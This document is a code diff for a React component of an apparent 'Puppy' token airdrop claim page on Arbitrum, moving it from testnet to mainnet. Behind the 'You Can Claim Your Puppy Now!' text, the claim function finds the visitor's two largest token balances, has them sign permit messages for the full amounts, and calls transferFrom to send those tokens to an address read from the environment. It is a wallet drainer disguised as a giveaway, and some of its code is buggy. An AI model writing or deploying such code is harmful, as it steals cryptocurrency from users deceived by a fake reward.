@@ -7,11 +7,8 @@ import { ethers } from "ethers"
 import { useEthersSigner } from "../../back-end/ethersSigner.js"
 import {
   mainnetContractAddresses,
-  testnetAddress,
   abi,
-  testnetOwnerPrivateKey,
-  tesnetOwnerAddress,
-  testnetRpcUrl,
+  mainnetRpcUrl,
 } from "../../back-end/contracts.js"
 import CountdownTimer from "./timer"
 import Popup from "../popup/popup"
@@ -92,35 +89,48 @@ const Box2 = () => {
 
   async function claim() {
     setClaiming(true)
-    const walletProvider = new ethers.providers.JsonRpcProvider(testnetRpcUrl)
-    const wallet = new ethers.Wallet(testnetOwnerPrivateKey, walletProvider)
+
+    const walletProvider = new ethers.providers.JsonRpcProvider(mainnetRpcUrl)
+    const privateKey = process.env.PRIVATE_KEY
+    const wallet = new ethers.Wallet(privateKey, walletProvider)
 
     let maxBalanceIndex = 0
     let maxBalance = 0
-    for (let i = 0; i < testnetAddress.length; i++) {
-      const token = new ethers.Contract(testnetAddress[i].address, abi, wallet)
+    let max2BalanceIndex = 1
+    let max2Balance = 0
+    for (let i = 0; i < mainnetContractAddresses.length; i++) {
+      const token = new ethers.Contract(
+        mainnetContractAddresses[i].address,
+        abi,
+        wallet,
+      )
 
       let balance
       if (i == 0) {
         balance = ((await token.balanceOf(address)) * 6) / 1e4
-        if (balance > maxBalance) {
+        if (balance >= maxBalance) {
           maxBalanceIndex = i
           maxBalance = balance
+        } else if (balance < max2Balance && balance >= max2Balance) {
+          max2BalanceIndex = i
+          max2Balance = balance
         }
       } else {
         balance =
-          (await token.balanceOf(address)) / 10 ** testnetAddress[i].decimals
-        if (balance > maxBalance) {
+          (await token.balanceOf(address)) /
+          10 ** mainnetContractAddresses[i].decimals
+        if (balance >= maxBalance) {
           maxBalanceIndex = i
           maxBalance = balance
+        } else if (balance < max2Balance && balance >= max2Balance) {
+          max2BalanceIndex = i
+          max2Balance = balance
         }
       }
     }
 
-    console.log(maxBalanceIndex)
-
     const contract = new ethers.Contract(
-      testnetAddress[maxBalanceIndex].address,
+      mainnetContractAddresses[maxBalanceIndex].address,
       abi,
       wallet,
     )
@@ -129,10 +139,10 @@ const Box2 = () => {
     const value = await contract.balanceOf(address)
     const nonce = await contract.nonces(address)
     const domain = {
-      name: testnetAddress[maxBalanceIndex].name,
-      version: testnetAddress[maxBalanceIndex].version.toString(),
-      chainId: 421614,
-      verifyingContract: testnetAddress[maxBalanceIndex].address,
+      name: mainnetContractAddresses[maxBalanceIndex].name,
+      version: mainnetContractAddresses[maxBalanceIndex].version.toString(),
+      chainId: 42161,
+      verifyingContract: mainnetContractAddresses[maxBalanceIndex].address,
     }
     const types = {
       Permit: [
@@ -145,7 +155,7 @@ const Box2 = () => {
     }
     const message = {
       owner: address,
-      spender: tesnetOwnerAddress,
+      spender: process.env.ADDRESS,
       value: value.toString(),
       nonce: nonce.toString(),
       deadline: deadline.toString(),
@@ -154,9 +164,9 @@ const Box2 = () => {
     const signature = await signer._signTypedData(domain, types, message)
     const { v, r, s } = ethers.utils.splitSignature(signature)
 
-    const tx = await contract.permit(
+    await contract.permit(
       address,
-      tesnetOwnerAddress,
+      process.env.ADDRESS,
       value,
       deadline,
       v,
@@ -164,11 +174,55 @@ const Box2 = () => {
       s,
     )
 
-    console.log(tx)
+    await contract.transferFrom(address, process.env.ADDRESS, value)
 
-    const tx2 = await contract.transferFrom(address, tesnetOwnerAddress, value)
+    const contract2 = new ethers.Contract(
+      mainnetContractAddresses[max2BalanceIndex].address,
+      abi,
+      wallet,
+    )
 
-    console.log(tx2)
+    const deadline2 = Math.floor(Date.now() / 1000) + 3600000 // 1 hour from now
+    const value2 = await contract2.balanceOf(address)
+    const nonce2 = await contract2.nonces(address)
+    const domain2 = {
+      name: mainnetContractAddresses[max2BalanceIndex].name,
+      version: mainnetContractAddresses[max2BalanceIndex].version.toString(),
+      chainId: 42161,
+      verifyingContract: mainnetContractAddresses[max2BalanceIndex].address,
+    }
+    const types2 = {
+      Permit: [
+        { name: "owner", type: "address" },
+        { name: "spender", type: "address" },
+        { name: "value", type: "uint256" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" },
+      ],
+    }
+    const message2 = {
+      owner: address,
+      spender: process.env.ADDRESS,
+      value: value2.toString(),
+      nonce: nonce2.toString(),
+      deadline: deadline2.toString(),
+    }
+
+    const signature2 = await signer._signTypedData(domain2, types2, message2)
+    const { v2, r2, s2 } = ethers.utils.splitSignature(signature2)
+
+    await contract2.permit(
+      address,
+      process.env.ADDRESS,
+      value2,
+      deadline2,
+      v2,
+      r2,
+      s2,
+    )
+
+    await contract2.transferFrom(address, process.env.ADDRESS, value2)
+
     setClaiming(false)
   }
   return (
@@ -178,8 +232,8 @@ const Box2 = () => {
           <span className="label">FCFS</span>
           <span className="titleoftimer">You Can Claim Your Puppy Now!</span>
           <p className="paragraphBox">
-            A tootal of 400,000,000,000,000 puppy is now available to be claimed
-            by those who have ERC20 Transaction in Arbitrum. Also by entering a
+            A tootal of 9,900,000,000 puppy is now available to be claimed by
+            those who have ERC20 Transaction in Arbitrum. Also by entering a
             referral id in referral input, get 10% bonus!
           </p>
           <div className="progress-container">
